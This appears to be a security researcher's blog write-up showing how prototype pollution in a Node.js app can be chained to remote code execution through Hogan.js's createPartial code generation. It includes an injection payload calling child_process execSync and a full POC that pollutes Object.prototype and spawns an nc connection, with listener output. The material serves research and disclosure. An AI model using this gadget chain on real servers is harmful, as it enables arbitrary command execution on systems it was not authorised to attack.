---
title: RCE via Twitter Hogan.js
date: 2021-12-15
author: 1nt3rc3pt0r
author_url: https://twitter.com/_1nt3rc3pt0r_
categories:
 - Web Exploitation
 - Bug Bounty
tags:
 - Prototype Pollution
 - Hogan_js
---

**tl;dr**

+ Reversing Hogan.js
+ RCE - using Hogan-js
<!--more-->


## Introduction 

In this Blog i will be explaining how i gained RCE using [Twitter Hogan.js](https://github.com/twitter/hogan.js) when Prototype Pollution exists.

Few days back Michał Bentkowski released a server side prototype pollution [challenge](https://air-pollution.challenge.ctf.expert/)where RCE is required to get flag all we have is Prototype Pollution , which reminds me of [AST-Injection](https://blog.p6.is/AST-Injection/)

I started looking through the challenge and suddenly my eyes caught on Hogan.js which is used to compile the Mustache Templating language so I started looking into its source code.Even After checking them multiple times I couldn't  find any chains that helps to gain RCE as per the challenge.But yeah I found a few lines that could be useful to gain RCE apart from challenge.

In this blog I will be explaining how I was able to chain Prototype pollution to RCE via Hogan Js.
For those who need more information check this amazing Findings by [POSIX](https://blog.p6.is/AST-Injection/)


## Reversing Hogan.js

In short, Hogan.codegen in `compiler.js` is responsible for code generation depending on the cases and later , this generated code gets executed.

While going through each function and the way each builds the code by appending objects to Strings.Most of the objects where pre defined so Prototype Pollution is ineffective in such situations.


```javascript
Hogan.codegen = {
    '#': function(node, context) {
      context.code += 'if(t.s(t.' + chooseMethod(node.n) + '("' + esc(node.n) + '",c,p,1),' +
                      'c,p,0,' + node.i + ',' + node.end + ',"' + node.otag + " " + node.ctag + '")){' +
                      't.rs(c,p,' + 'function(c,p,t){';
      Hogan.walk(node.nodes, context);
      context.code += '});c.pop();}';
    },

    '^': function(node, context) {
      context.code += 'if(!t.s(t.' + chooseMethod(node.n) + '("' + esc(node.n) + '",c,p,1),c,p,1,0,0,"")){';
      Hogan.walk(node.nodes, context);
      context.code += '};';
    },

    '>': createPartial,
    '<': function(node, context) {
      var ctx = {partials: {}, code: '', subs: {}, inPartial: true};
      Hogan.walk(node.nodes, ctx);
      var template = context.partials[createPartial(node, context)];
      template.subs = ctx.subs;
      template.partials = ctx.partials;
    },

    '$': function(node, context) {
      var ctx = {subs: {}, code: '', partials: context.partials, prefix: node.n};
      Hogan.walk(node.nodes, ctx);
      context.subs[node.n] = ctx.code;
      if (!context.inPartial) {
        context.code += 't.sub("' + esc(node.n) + '",c,p,i);';
      }
    },

    '\n': function(node, context) {
      context.code += write('"\\n"' + (node.last ? '' : ' + i'));
    },

    '_v': function(node, context) {
      context.code += 't.b(t.v(t.' + chooseMethod(node.n) + '("' + esc(node.n) + '",c,p,0)));';
    },

    '_t': function(node, context) {
      context.code += write('"' + esc(node.text) + '"');
    },

    '{': tripleStache,

    '&': tripleStache
  }
```

But the function `createPartial` looks unsafe.When it comes to `context.prefix` and `node.indent` value is added if value exists else it keeps it as empty.


```javascript
function createPartial(node, context) {
    var prefix = "<" + (context.prefix || "");
    var sym = prefix + node.n + serialNo++;
    context.partials[sym] = {name: node.n, partials: {}};
    context.code += 't.b(t.rp("' +  esc(sym) + '",c,p,"' + (node.indent || '') + '"));';
    return sym;
  }
```


Yay!!! So Prototype Pollution can Pollute them but how is this function called by `Hogan.codegen` ?

In Hogan.js there is something called `tokens` which is used to generate codes. Token can be extracted by following way.


code
```javascript

var template = "my {{>example}} template.";
var tokens=hogan.scan(template)
console.log("tokens",tokens)

```


Output
```js
tokens [
  { tag: '_t', text: [String: 'my '] },
  { tag: '>', n: 'example', otag: '{{', ctag: '}}', i: 15 },
  { tag: '_t', text: [String: ' template.'] }
]

```

In tokens tags are used to call corresponding functions checking `Hogan.codegen` in this case tag : '>' calls `createPartial`.


## Code Execution

Now we have Prototype Pollution that Successfully pollutes the generated codes but creating a working Exploit was a bit challenging.When I debugged generated code I came to the conclusion that directly adding “ to break the generated code returns bad syntax and ends executing.So my idea was to use `console.log`

```javascript
console.log(\"));console.log(process.mainModule.require('child_process').execSync('id').toString())//\")
```

When `console.log("some string")` is used this ends as a function so no more bad syntax when Double quotes are used.
This is how the generated code looks like when it gets polluted with above exploit.

```javascript

t.b("my ");t.b(t.rp("<abcdexample0",c,p,"console.log("));console.log(process.mainModule.require('child_process').execSync('id').toString())//")"));t.b(" template.");

```


## POC

Code
```javascript
var hogan = require("hogan.js");

// construct template string
var template = "my {{>example}} template.";

//Prototype Pollution
constructor.prototype.indent="console.log(\"));console.log(process.mainModule.require('child_process').execSync('nc 127.0.0.1 1337'))//\")";
constructor.prototype.prefix="abcd";

var tokens=hogan.scan(template)
console.log("tokens",tokens)

// compile template
var compiled = hogan.compile(template);

console.log("compiled" , compiled)
var s = compiled.render({example: 'twitterer' })
console.log("renderd",s)

```



```
┌──(sbk㉿kali)-[/media/sbk/1n73rc3p70r_B10g]
└─$ nc -lvp 1337
listening on [any] 1337 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 59134

```
